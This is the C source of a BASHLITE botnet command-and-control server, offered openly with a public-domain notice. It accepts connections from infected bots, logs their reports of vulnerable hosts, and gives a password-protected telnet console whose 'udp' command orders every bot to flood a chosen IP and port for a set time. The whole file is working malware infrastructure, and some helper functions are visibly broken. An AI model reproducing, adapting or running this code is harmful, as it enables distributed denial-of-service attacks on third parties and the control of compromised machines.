/*
  BASHLITE:
  This is the custom command &control server
  LICENSE AGREEMENT:
    Public Domain
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>

#define MY_MGM_PASS "password"
#define MY_MGM_PORT 8888
#define MAXFDS 1000000	// No way we actually reach this amount. Ever.


void reuse_addr(int fd)
{
    int check = 0;
    int s = 1;
    check = setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &s, sizeof(s));
    if(check < 0)
    {
        exit(1);
    }
    else
    {
        /*do nothing it was successfull */
    }
}

struct clientdata_t
{
	uint32_t ip;
	char build[7];
	char connected;
} clients[MAXFDS];

struct telnetdata_t
{
	int connected;
} managements[MAXFDS];

static volatile FILE * fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize) 
    {
        got = recv(fd, buffer + total, 1, MSG_NOSIGNAL);
        if(got != 1) {return -1;}
        if(buffer[total] == '\r')
        {
            buffer[total] = 0;
            continue;
        }
        if(buffer[total] == '\n')
        {
            buffer[total] = 0;
            break;
        }
        total++;
    }
	return total;
}

void trim(char *str)	// Remove whitespace from a string and properly null-terminate it.
{
	int i;
	int begin = 0;
	int end = strlen(str) - 1;
	while (isspace(str[begin])) begin++;
	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];
	str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
	// man fcntl
	int flags, s;
	flags = fcntl(sfd, F_GETFL, 0);
	if (flags == -1)
	{
		perror("fcntl");
		return -1;
	}

	flags |= O_NONBLOCK;
	/*
	      F_SETFL (int)
	      Set  the  file  status  flags  to  the  value specified by arg.  File access mode (O_RDONLY, O_WRONLY, O_RDWR) and file creation flags (i.e., O_CREAT, O_EXCL, O_NOCTTY, O_TRUNC) in arg are
	      ignored.  On Linux this command can change only the O_APPEND, O_ASYNC, O_DIRECT, O_NOATIME, and O_NONBLOCK flags.
	*/
	s = fcntl(sfd, F_SETFL, flags);
	if (s == -1)
	{
		perror("fcntl");
		return -1;
	}

	return 0;
}

static int create_and_bind(char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC; /*Return IPv4 and IPv6 choices */
	hints.ai_socktype = SOCK_STREAM; /*We want a TCP socket */
	hints.ai_flags = AI_PASSIVE; /*All interfaces */
	s = getaddrinfo(NULL, port, &hints, &result);
	if (s != 0)
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
		return -1;
	}

	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
		{
			break;
		}

		close(sfd);
	}

	if (rp == NULL)
	{
		fprintf(stderr, "Could not bind\n");
		return -1;
	}

	freeaddrinfo(result);
	return sfd;
}

int util_zero(void *ptr, uint32_t size)
{
    uint8_t *ptr_w = (uint8_t *)ptr;
    uint32_t j;
    for(j = 0; j < size; j++)
    {
        ptr_w[j] = 0;
    }
}

uint32_t util_len(void *ptr)
{
    register uint8_t *buff = ptr;
    register int ret = 0;
    while(*buff != 0)
    {
         ret++;
         buff += 1;
    }
}

void util_cpy(void *ptr, void *ptr2, int size)
{
    for(size--; size >= 0; size--)
    {
        ((uint8_t *)ptr)[size] = ((uint8_t *)ptr2)[size];
    }
    return;
}

int util_match(void *ptr, void *ptr2, int size)
{
    for(size -= 1; size >= 0; size++)
    {
        if(((uint8_t *)ptr)[size] == ((uint8_t *)ptr2)[size])
        {
            continue;
        }
        return 0;
    }
    return 1;
}

int util_exists(void *ptr, void *ptr2, int ptr_size, int ptr2_size)
{
    if(ptr2_size > ptr_size) return -1;
	int ptr2_pos = ptr2_size-1;
    for(ptr_size -= 1; ptr_size >= 0; ptr_size--)
    {
        if(((uint8_t *)ptr)[ptr_size] == ((uint8_t *)ptr2)[ptr2_pos])
        {
            ptr2_pos--;
            if(ptr2_pos == 0) { return ptr_size+ptr2_size; }
            continue;
        }

        ptr2_pos = ptr2_size-1;
        continue;
    }
    if(ptr2_pos == 0) { return ptr_size+ptr2_size; }
    return -1;
}

uint8_t **util_tokenize(uint8_t *buf, int buf_size, int *count, uint8_t delim)
{
    uint8_t **ret = NULL;
    int ret_count = 0, token_pos = 0;
    uint8_t *token = malloc(512);
    util_zero(token, 512);
    int pos =0;
    for (pos = 0; pos < buf_size; pos++)
    {
        if(buf[pos] == delim)
        {
            token[token_pos] = 0;
            
            ret = realloc(ret, (ret_count + 1) *sizeof(uint8_t *));
            ret[ret_count] = malloc(token_pos + 1);
            util_zero(ret[ret_count], token_pos+1);
            util_cpy(ret[ret_count], token, token_pos);
            ret_count++;

            util_zero(token, 512);
            token_pos = 0;
            continue;
        }

        token[token_pos] = buf[pos];
        token_pos++;
        if(token_pos == 512)
        {
            util_zero(token, 512);
            token_pos = 0;
        }
    }

    if(token_pos > 0)
    {
        ret = realloc(ret, (ret_count + 1) *sizeof(uint8_t *));
        ret[ret_count] = malloc(token_pos + 1);
        util_zero(ret[ret_count], token_pos+1);
        util_cpy(ret[ret_count], token, token_pos);
        ret_count++;

        util_zero(token, 512);
        token_pos = 0;
    }

    *count = ret_count;

    util_zero(token, 512);
    free(token);
    token = NULL;

    if(ret_count > 0) return ret;
    if(ret != NULL) free(ret);
    return NULL;
}

void broadcast_attack(char *target, char *port, char *duration, int us)	// sends message to all bots, notifies the management clients of this happening
{
    char buffer[1024];
    int buffer_len = 1;
    memset(buffer, 0, 1024);
    
    char separator = 0xff;
    
    memcpy(buffer+buffer_len, &separator, 1);
    buffer_len += 1;
    
    memcpy(buffer+buffer_len, target, strlen(target));
    buffer_len += strlen(target);
    
    memcpy(buffer+buffer_len, &separator, 1);
    buffer_len += 1;
    
    memcpy(buffer+buffer_len, port, strlen(port));
    buffer_len += strlen(port);
    
    memcpy(buffer+buffer_len, &separator, 1);
    buffer_len += 1;
    
    memcpy(buffer+buffer_len, duration, strlen(duration));
    buffer_len += strlen(duration);
    
    memcpy(buffer+buffer_len, "\r\n\n\r", 4);
    buffer_len += 4;
    
	int i;
	for (i = 0; i < MAXFDS; i++)
	{
		if (i == us || (!clients[i].connected)) continue;
		send(i, buffer, buffer_len, MSG_NOSIGNAL);
	}
}

void *epollEventLoop(void *useless)	// the big loop used to control each bot asynchronously. Many threads of this get spawned.
{
	struct epoll_event event;
	struct epoll_event * events;
    
    memset(&event ,0 , sizeof(struct epoll_event));
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events &EPOLLERR) || (events[i].events &EPOLLHUP) || (!(events[i].events &EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);	// accept a connection from a bot.
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)	// check for duplicate clients by seeing if any have the same IP as the one connecting
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

					if (dup)
					{
                        uint8_t byte = 1;
						if (send(infd, &byte, 1, MSG_NOSIGNAL) == -1)
						{
							close(infd);
							continue;
						}
                        if (send(infd, "\r\n\n\r", 4, MSG_NOSIGNAL) == -1)
						{
							close(infd);
							continue;
						}
						close(infd);
						continue;
					}

					s = make_socket_non_blocking(infd);
					if (s == -1)
					{
						close(infd);
						break;
					}

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;
					//send(infd, "!*SCANNER ON\n", 14, MSG_NOSIGNAL);
                    printf("New bot from %d.%d.%d.%d\r\n", clients[infd].ip & 0xff, (clients[infd].ip >> 8)& 0xff, (clients[infd].ip >> 16)& 0xff, (clients[infd].ip >> 24)& 0xff);
				}

				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL)
						{
							done = 1;
							break;
						}

						trim(buf);
						if (strcmp(buf, "PING") == 0)	// basic IRC-like ping/pong challenge/response to see if server is alive
						{
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1)
							{
								done = 1;
								break;
							}	// response
							continue;
						}

						if (strstr(buf, "BUILD ") == buf)
						{
							char *build = strstr(buf, "BUILD ") + 6;
							if (strlen(build) > 6)
							{
								printf("build bigger then 6\n");
								done = 1;
								break;
							}

							memset(client->build, 0, 7);
							strcpy(client->build, build);
							continue;
						}

						if (strstr(buf, "REPORT ") == buf)	// received a report of a vulnerable system from a scan
						{
							char *line = strstr(buf, "REPORT ") + 7;
							fprintf(fileFD, "%s\n", line);	// let's write it out to disk without checking what it is!
							fflush(fileFD);
							//TODO: automatically exploit that particular IP after scanning for dir and uploading correct arch stuffs.
							continue;
						}

						if (strcmp(buf, "PONG") == 0)
						{
						 				//should really add some checking or something but meh
							continue;
						}

						printf("buf: \"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}

						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
					close(thefd);
				}
			}
		}
	}
}

unsigned int clientsConnected()	// counts the number of bots connected by looping over every possible file descriptor and checking if it's connected or not
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}

void *titleWriter(void *sock)	// just an informational banner
{
	// this LOOKS vulnerable, but it's actually not.
	// there's no way we can have 2000 digits' worth of clients/bots connected to overflow that char array
	int thefd = (int) sock;
	char string[2048];
	while (1)
	{
		memset(string, 0, 2048);
		sprintf(string, "%c]0;Bots connected: %d | Clients connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
		// \007 is a bell character... causes a beep. Why is there a beep here?
		if (send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;

		sleep(2);
	}
}

void *telnetWorker(void *sock)
{
    pthread_detach(pthread_self());
    
	int thefd = (int) sock;
	managesConnected++;
	pthread_t title;
	char buf[2048];
	memset(buf, 0, sizeof buf);

	if (send(thefd, "password: ", 10, MSG_NOSIGNAL) == -1) goto end; /*failed to send... kill connection  */
	if (fdgets(buf, sizeof buf, thefd) <= 0) goto end; /*no data, kill connection */
	trim(buf);
    
	if (strcmp(buf, MY_MGM_PASS) != 0) goto end; /*bad pass, kill connection */
	memset(buf, 0, 2048);
    
    
	if (send(thefd, "\033[1A", 4, MSG_NOSIGNAL) == -1) goto end;
	pthread_create(&title, NULL, &titleWriter, sock); /*writes the informational banner to the admin after a login */


	managements[thefd].connected = 1;
    
    if (send(thefd, "\x1b[31m > \x1b[0m", strlen("\x1b[31m > \x1b[0m"), MSG_NOSIGNAL) == -1) goto end;
    
    int rc = 0;
    memset(buf, 0, 2048);
	while ((rc = fdgets(buf, sizeof buf, thefd)) >= 0)
	{
        if(rc == 0) 
        {
            if (send(thefd, "\x1b[31m > \x1b[0m", strlen("\x1b[31m > \x1b[0m"), MSG_NOSIGNAL) == -1) goto end;
            continue;
        }
        int argc = 0;
        uint8_t **argv = util_tokenize(buf, strlen(buf), &argc, ' ');
        if(argc > 0 && argv != NULL)
        {
             if(strcmp(argv[0], "udp") == 0)
             {
                  char *target;
                  char *port;
                  char *duration;
                  if(argc == 4)
                  {
                      target = argv[1];
                      port  = argv[2];
                      duration = argv[3];
                     if(atoi(port) < 1 || atoi(port) > 65500)
                     {
                          if (send(thefd, "invalid port 0-65500\r\n", strlen("invalid port 0-65500\r\n"), MSG_NOSIGNAL) == -1) goto end;
                     }
                     else if(atoi(duration) > 3600 || atoi(duration) < 20)
                     {
                          if (send(thefd, "invalid time 20-3600\r\n", strlen("invalid time 20-3600\r\n"), MSG_NOSIGNAL) == -1) goto end;
                     }
                     else
                     {
                         broadcast_attack(target, port, duration, thefd); 
                         if (send(thefd, "Success, sent attack\r\n", strlen("Success, sent attack\r\n"), MSG_NOSIGNAL) == -1) goto end;
                     }
                  }
                  else
                  {
                     if (send(thefd, "TRY \"udp <IP> <PORT> <TIME>\"\r\n", strlen("TRY \"udp <IP> <PORT> <TIME>\"\r\n"), MSG_NOSIGNAL) == -1) goto end; 
                  }
                  
             }
        }
        
        int x;
        for(x = 0; x < argc; x++)
        {
            free(argv[x]);
            argv[x] = NULL;
        }
        free(argv);
        argv = NULL;
        
		if (send(thefd, "\x1b[31m > \x1b[0m", strlen("\x1b[31m > \x1b[0m"), MSG_NOSIGNAL) == -1) goto end;
		printf("management: \"%s\"\n", buf);
		memset(buf, 0, 2048);
	}

	end:	// cleanup dead socket
		managements[thefd].connected = 0;
	close(thefd);
	managesConnected--;
}

void *telnetListener(void *useless)
{
	int sockfd, newsockfd;
	socklen_t clilen;
	struct sockaddr_in serv_addr, cli_addr;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
    reuse_addr(sockfd);
	if (sockfd < 0) perror("ERROR opening socket");
	bzero((char*) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(MY_MGM_PORT);
	if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
	listen(sockfd, 5);
	clilen = sizeof(cli_addr);
	while (1)
	{
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
		if (newsockfd < 0) perror("ERROR on accept");
		pthread_t thread;
		pthread_create(&thread, NULL, &telnetWorker, (void*) newsockfd);
	}
}

int main(int argc, char *argv[])
{
	signal(SIGPIPE, SIG_IGN);	// ignore broken pipe errors sent from kernel

	int s, threads;
	struct epoll_event event;

	if (argc != 3)
	{
		fprintf(stderr, "Usage: %s[port][threads]\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	fileFD = fopen("output.txt", "a+");	// TOCTOU vuln if we have access to CnC
	threads = atoi(argv[2]);

	listenFD = create_and_bind(argv[1]);	// try to create a listening socket, die if we can't
	if (listenFD == -1) abort();

	s = make_socket_non_blocking(listenFD);	// try to make it nonblocking, die if we can't
	if (s == -1) abort();

	s = listen(listenFD, SOMAXCONN);	// listen with a huge backlog, die if we can't
	if (s == -1)
	{
		perror("listen");
		abort();
	}

	epollFD = epoll_create1(0);	// make an epoll listener, die if we can't
	if (epollFD == -1)
	{
		perror("epoll_create");
		abort();
	}

	event.data.fd = listenFD;
	event.events = EPOLLIN | EPOLLET;
	s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
	if (s == -1)
	{
		perror("epoll_ctl");
		abort();
	}

	pthread_t thread[threads + 2];
	while (threads--)
	{
		pthread_create(&thread[threads + 1], NULL, &epollEventLoop, (void*) NULL);	// make a thread to command each bot individually
	}

	pthread_create(&thread[0], NULL, &telnetListener, (void*) NULL);

	while (1)
	{
		sleep(60);
	}

	close(listenFD);

	return EXIT_SUCCESS;
}